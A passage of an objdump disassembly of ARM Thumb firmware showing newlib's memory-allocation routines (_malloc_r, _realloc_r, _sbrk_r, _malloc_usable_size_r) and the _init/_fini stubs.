 80021a0:	b991      	cbnz	r1, 80021c8 <_malloc_r+0x54>
 80021a2:	4c22      	ldr	r4, [pc, #136]	; (800222c <_malloc_r+0xb8>)
 80021a4:	6823      	ldr	r3, [r4, #0]
 80021a6:	b91b      	cbnz	r3, 80021b0 <_malloc_r+0x3c>
 80021a8:	4630      	mov	r0, r6
 80021aa:	f000 f867 	bl	800227c <_sbrk_r>
 80021ae:	6020      	str	r0, [r4, #0]
 80021b0:	4629      	mov	r1, r5
 80021b2:	4630      	mov	r0, r6
 80021b4:	f000 f862 	bl	800227c <_sbrk_r>
 80021b8:	1c43      	adds	r3, r0, #1
 80021ba:	d126      	bne.n	800220a <_malloc_r+0x96>
 80021bc:	230c      	movs	r3, #12
 80021be:	4630      	mov	r0, r6
 80021c0:	6033      	str	r3, [r6, #0]
 80021c2:	f000 f86c 	bl	800229e <__malloc_unlock>
 80021c6:	e7e4      	b.n	8002192 <_malloc_r+0x1e>
 80021c8:	680b      	ldr	r3, [r1, #0]
 80021ca:	1b5b      	subs	r3, r3, r5
 80021cc:	d41a      	bmi.n	8002204 <_malloc_r+0x90>
 80021ce:	2b0b      	cmp	r3, #11
 80021d0:	d90f      	bls.n	80021f2 <_malloc_r+0x7e>
 80021d2:	600b      	str	r3, [r1, #0]
 80021d4:	18cc      	adds	r4, r1, r3
 80021d6:	50cd      	str	r5, [r1, r3]
 80021d8:	4630      	mov	r0, r6
 80021da:	f000 f860 	bl	800229e <__malloc_unlock>
 80021de:	f104 000b 	add.w	r0, r4, #11
 80021e2:	1d23      	adds	r3, r4, #4
 80021e4:	f020 0007 	bic.w	r0, r0, #7
 80021e8:	1ac3      	subs	r3, r0, r3
 80021ea:	d01b      	beq.n	8002224 <_malloc_r+0xb0>
 80021ec:	425a      	negs	r2, r3
 80021ee:	50e2      	str	r2, [r4, r3]
 80021f0:	bd70      	pop	{r4, r5, r6, pc}
 80021f2:	428c      	cmp	r4, r1
 80021f4:	bf0b      	itete	eq
 80021f6:	6863      	ldreq	r3, [r4, #4]
 80021f8:	684b      	ldrne	r3, [r1, #4]
 80021fa:	6013      	streq	r3, [r2, #0]
 80021fc:	6063      	strne	r3, [r4, #4]
 80021fe:	bf18      	it	ne
 8002200:	460c      	movne	r4, r1
 8002202:	e7e9      	b.n	80021d8 <_malloc_r+0x64>
 8002204:	460c      	mov	r4, r1
 8002206:	6849      	ldr	r1, [r1, #4]
 8002208:	e7ca      	b.n	80021a0 <_malloc_r+0x2c>
 800220a:	1cc4      	adds	r4, r0, #3
 800220c:	f024 0403 	bic.w	r4, r4, #3
 8002210:	42a0      	cmp	r0, r4
 8002212:	d005      	beq.n	8002220 <_malloc_r+0xac>
 8002214:	1a21      	subs	r1, r4, r0
 8002216:	4630      	mov	r0, r6
 8002218:	f000 f830 	bl	800227c <_sbrk_r>
 800221c:	3001      	adds	r0, #1
 800221e:	d0cd      	beq.n	80021bc <_malloc_r+0x48>
 8002220:	6025      	str	r5, [r4, #0]
 8002222:	e7d9      	b.n	80021d8 <_malloc_r+0x64>
 8002224:	bd70      	pop	{r4, r5, r6, pc}
 8002226:	bf00      	nop
 8002228:	200018f4 	.word	0x200018f4
 800222c:	200018f8 	.word	0x200018f8

08002230 <_realloc_r>:
 8002230:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 8002232:	4607      	mov	r7, r0
 8002234:	4614      	mov	r4, r2
 8002236:	460e      	mov	r6, r1
 8002238:	b921      	cbnz	r1, 8002244 <_realloc_r+0x14>
 800223a:	4611      	mov	r1, r2
 800223c:	e8bd 40f8 	ldmia.w	sp!, {r3, r4, r5, r6, r7, lr}
 8002240:	f7ff bf98 	b.w	8002174 <_malloc_r>
 8002244:	b922      	cbnz	r2, 8002250 <_realloc_r+0x20>
 8002246:	f7ff ff49 	bl	80020dc <_free_r>
 800224a:	4625      	mov	r5, r4
 800224c:	4628      	mov	r0, r5
 800224e:	bdf8      	pop	{r3, r4, r5, r6, r7, pc}
 8002250:	f000 f826 	bl	80022a0 <_malloc_usable_size_r>
 8002254:	4284      	cmp	r4, r0
 8002256:	d90f      	bls.n	8002278 <_realloc_r+0x48>
 8002258:	4621      	mov	r1, r4
 800225a:	4638      	mov	r0, r7
 800225c:	f7ff ff8a 	bl	8002174 <_malloc_r>
 8002260:	4605      	mov	r5, r0
 8002262:	2800      	cmp	r0, #0
 8002264:	d0f2      	beq.n	800224c <_realloc_r+0x1c>
 8002266:	4631      	mov	r1, r6
 8002268:	4622      	mov	r2, r4
 800226a:	f7ff fbc5 	bl	80019f8 <memcpy>
 800226e:	4631      	mov	r1, r6
 8002270:	4638      	mov	r0, r7
 8002272:	f7ff ff33 	bl	80020dc <_free_r>
 8002276:	e7e9      	b.n	800224c <_realloc_r+0x1c>
 8002278:	4635      	mov	r5, r6
 800227a:	e7e7      	b.n	800224c <_realloc_r+0x1c>

0800227c <_sbrk_r>:
 800227c:	b538      	push	{r3, r4, r5, lr}
 800227e:	2300      	movs	r3, #0
 8002280:	4c05      	ldr	r4, [pc, #20]	; (8002298 <_sbrk_r+0x1c>)
 8002282:	4605      	mov	r5, r0
 8002284:	4608      	mov	r0, r1
 8002286:	6023      	str	r3, [r4, #0]
 8002288:	f7ff fb26 	bl	80018d8 <_sbrk>
 800228c:	1c43      	adds	r3, r0, #1
 800228e:	d102      	bne.n	8002296 <_sbrk_r+0x1a>
 8002290:	6823      	ldr	r3, [r4, #0]
 8002292:	b103      	cbz	r3, 8002296 <_sbrk_r+0x1a>
 8002294:	602b      	str	r3, [r5, #0]
 8002296:	bd38      	pop	{r3, r4, r5, pc}
 8002298:	20001a94 	.word	0x20001a94

0800229c <__malloc_lock>:
 800229c:	4770      	bx	lr

0800229e <__malloc_unlock>:
 800229e:	4770      	bx	lr

080022a0 <_malloc_usable_size_r>:
 80022a0:	f851 0c04 	ldr.w	r0, [r1, #-4]
 80022a4:	2800      	cmp	r0, #0
 80022a6:	f1a0 0004 	sub.w	r0, r0, #4
 80022aa:	bfbc      	itt	lt
 80022ac:	580b      	ldrlt	r3, [r1, r0]
 80022ae:	18c0      	addlt	r0, r0, r3
 80022b0:	4770      	bx	lr
	...

080022b4 <_init>:
 80022b4:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 80022b6:	bf00      	nop
 80022b8:	bcf8      	pop	{r3, r4, r5, r6, r7}
 80022ba:	bc08      	pop	{r3}
 80022bc:	469e      	mov	lr, r3
 80022be:	4770      	bx	lr

080022c0 <_fini>:
 80022c0:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 80022c2:	bf00      	nop
 80022c4:	bcf8      	pop	{r3, r4, r5, r6, r7}
 80022c6:	bc08      	pop	{r3}
 80022c8:	469e      	mov	lr, r3
 80022ca:	4770      	bx	lr
